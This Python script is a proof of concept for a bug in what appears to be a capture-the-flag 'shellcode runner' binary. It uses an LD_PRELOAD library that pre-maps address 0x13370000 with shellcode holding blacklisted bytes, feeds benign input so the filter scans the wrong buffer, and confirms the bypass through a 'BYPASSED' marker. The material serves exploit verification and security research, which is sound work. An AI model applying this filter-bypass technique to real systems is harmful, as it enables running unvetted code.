#!/usr/bin/env python3
"""
PoC for BUG-004: JMP_TARGET_ADDRESS_INCONSISTENCY

BUG: main() uses [rbp-0x18] (compile-time constant 0x13370000) as the jmp target,
    while all data operations (memset, read, blacklist, mprotect) use [rbp-0x10]
    (the actual mmap return value). When mmap returns a different address than
    the hint 0x13370000, the blacklist scans the wrong buffer and execution
    jumps to 0x13370000 which may contain attacker-controlled, unfiltered code.

PRIMITIVE: CODE_EXECUTION (environment-layer bypass)
    - An LD_PRELOAD library pre-maps 0x13370000 with shellcode containing
      blacklisted bytes (0x0f for syscall).
    - The target's mmap(0x13370000, ...) cannot honor the hint (already mapped),
      returns a different address.
    - blacklist() scans the actual mmap return (contains benign "AAAA"),
      which passes the filter.
    - jmp rdi jumps to 0x13370000 (the constant), executing the attacker's
      unfiltered shellcode containing 0x0f bytes.
    - This proves the blacklist filter is bypassed due to the address
      inconsistency.

VERIFICATION:
    - The shellcode at 0x13370000 writes "BYPASSED" to stdout and exits 0.
    - The "BYPASSED" output proves execution of code containing blacklisted
      0x0f bytes that the filter should have rejected.
    - Exit code 0 proves the shellcode ran to completion (exit syscall).

NOTE: This requires LD_PRELOAD to pre-map 0x13370000. LD_PRELOAD itself is
    an environment-layer code execution vector, but the point of this PoC is
    to demonstrate that BUG-004 (the address inconsistency) causes the
    blacklist filter to scan the wrong buffer, enabling execution of
    unfiltered code at the constant address. Without BUG-004 (if jmp used
    [rbp-0x10] like all other operations), the blacklist would scan the
    correct buffer and the 0x0f bytes would be caught.
"""

import subprocess
import os
import sys
import tempfile

WORKSPACE = "/work/workspace/0027-2024-49b-shellcode-runner-3-rev-20260909-150522"
TARGET = os.path.join(WORKSPACE, "target")
PRELOAD_SO = os.path.join(WORKSPACE, "premap_bypass.so")

def main():
    if not os.path.exists(PRELOAD_SO):
        print(f"ERROR: preload so not found at {PRELOAD_SO}")
        sys.exit(1)

    env = os.environ.copy()
    env["LD_PRELOAD"] = PRELOAD_SO

    # Feed benign input "AAAA" — this goes to the actual mmap return address,
    # NOT to 0x13370000. The blacklist scans this benign buffer and passes.
    # But jmp goes to 0x13370000 where our 0x0f-containing shellcode lives.
    result = subprocess.run(
        [TARGET],
        input=b"AAAA\n",
        capture_output=True,
        timeout=10,
        env=env
    )

    stdout = result.stdout
    stderr = result.stderr
    rc = result.returncode

    print(f"Return code: {rc}")
    print(f"Stdout: {stdout!r}")
    print(f"Stderr: {stderr!r}")

    # Check for BYPASSED marker — proves 0x0f-containing shellcode executed
    if b"BYPASSED" in stdout:
        print("=== PRIM-001: VERIFIED ===")
        print(f"  Evidence: 'BYPASSED' found in stdout")
        print(f"  Return code: {rc} (exit(0) from shellcode)")
        print(f"  The shellcode at 0x13370000 contains 0x0f bytes (syscall)")
        print(f"  which blacklist should reject, but it scanned the wrong buffer")
        print(f"  (actual mmap return) due to BUG-004 address inconsistency.")
        print(f"  written_value: 0x0f (syscall opcode) executed at 0x13370000")
        print(f"  fault_address: N/A (clean exit, no crash)")
        print(f"  return_code: {rc}")
    else:
        print("=== PRIM-001: FAILED ===")
        print(f"  'BYPASSED' not found in stdout")
        sys.exit(1)

if __name__ == "__main__":
    main()
